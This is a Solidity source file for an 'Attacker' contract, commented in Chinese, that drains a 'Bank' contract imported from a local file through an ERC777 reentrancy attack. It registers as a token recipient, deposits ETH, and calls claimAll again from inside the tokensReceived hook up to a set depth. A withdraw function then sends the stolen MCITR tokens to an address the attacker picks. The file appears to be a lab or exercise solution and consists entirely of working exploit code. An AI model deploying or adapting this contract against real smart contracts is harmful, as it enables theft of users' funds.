// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");

    IERC1820Registry private _erc1820 =
        IERC1820Registry(
            0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
        ); // EIP‑1820 registry (same on every chain)

    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");

    // re‑entrancy depth control
    uint8 private depth = 0;
    uint8 public max_depth = 2;

    Bank public bank;

    event Deposit(uint256 amount);
    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);

        // 注册为 ERC777 recipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    /// @notice 设置要攻击的 Bank 合约
    function setTarget(address bank_address)
        external
        onlyRole(ATTACKER_ROLE)
    {
        bank = Bank(bank_address);

        // 将本合约和目标 token 都加入 ATTACKER_ROLE，方便后续操作
        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, address(bank.token()));
    }

    /**
     * @notice 发起重入攻击
     * @param amt 初始存入 Bank 的 ETH 数量
     */
    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
        require(address(bank) != address(0), "Target bank not set");
        require(msg.value == amt, "Must send exactly amt wei");

        // 1) 存入 ETH 以获得正余额
        bank.deposit{value: amt}();
        emit Deposit(amt);

        // 2) 触发第一次 claimAll —— 在 ERC777 回调中将继续递归
        bank.claimAll();
    }

    /**
     * @notice 攻击完成后把盗取的 MCITR 转给指定地址
     */
    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        token.send(recipient, token.balanceOf(address(this)), "");
    }

    /**
     * @dev ERC777 接收钩子：在这里递归调用 claimAll() 实现重入
     *      只有在收到来自目标 MCITR token 的转账时才会执行递归。
     */
    function tokensReceived(
        address /*operator*/,
        address /*from*/,
        address /*to*/,
        uint256 /*amount*/,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external override {
        // 只在收到目标 MCITR token 时递归
        require(
            msg.sender == address(bank.token()),
            "Unexpected token contract"
        );

        if (depth < max_depth) {
            depth += 1;
            emit Recurse(depth);

            // 递归提取尚未归零的余额
            bank.claimAll();

            depth -= 1; // 回溯
        }
    }

    /* ===== fallbacks ===== */

    // 允许合约接收 ETH（当攻击者以后 redeem token 时会用到）
    receive() external payable {}
}
